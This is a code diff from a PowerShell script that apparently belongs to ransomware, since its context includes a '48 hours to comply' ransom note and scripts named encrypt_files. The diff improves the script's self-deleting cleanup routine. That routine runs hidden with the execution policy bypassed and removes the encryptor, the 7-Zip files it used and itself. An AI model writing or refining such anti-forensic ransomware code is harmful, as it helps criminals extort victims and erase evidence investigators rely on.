@@ -1020,14 +1020,18 @@ You have 48 hours to comply.
 
     # Create a cleanup script that will delete this PowerShell script
     $cleanupScript = Join-Path $env:TEMP "cleanup_$([System.IO.Path]::GetRandomFileName()).ps1"
+    $scriptToDelete = $MyInvocation.MyCommand.Path
+
     $selfDeleteContent = @"
 Start-Sleep -Seconds 2
-Remove-Item -Path '$($MyInvocation.MyCommand.Path)' -Force -ErrorAction SilentlyContinue
+Remove-Item -Path '$scriptToDelete' -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
-if (Test-Path '$($MyInvocation.MyCommand.Path)') {
-    Remove-Item -Path '$($MyInvocation.MyCommand.Path)' -Force -ErrorAction SilentlyContinue
+if (Test-Path '$scriptToDelete') {
+    Remove-Item -Path '$scriptToDelete' -Force -ErrorAction SilentlyContinue
 }
+Set-Location '$CurrentDir'
 Remove-Item -Path 'encrypt_files.bat' -Force -ErrorAction SilentlyContinue
+Remove-Item -Path 'encrypt_files.ps1' -Force -ErrorAction SilentlyContinue
 Remove-Item -Path '7z.exe' -Force -ErrorAction SilentlyContinue
 Remove-Item -Path '7z2501-x64.msi' -Force -ErrorAction SilentlyContinue
 Remove-Item -Path '7z2501-x64.exe' -Force -ErrorAction SilentlyContinue
@@ -1046,7 +1050,8 @@ Remove-Item -Path '$cleanupScript' -Force -ErrorAction SilentlyContinue
     $selfDeleteContent | Out-File -FilePath $cleanupScript -Encoding ASCII
     Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupScript`"" -NoNewWindow
 
-    if ($DebugMode) { Write-Host "[DEBUG] Self-delete script launched" -ForegroundColor Magenta }
+    if ($DebugMode) { Write-Host "[DEBUG] Self-delete script launched: $cleanupScript" -ForegroundColor Magenta }
+    if ($DebugMode) { Write-Host "[DEBUG] Script to delete: $scriptToDelete" -ForegroundColor Magenta }
 
 } catch {
     Write-Host ""
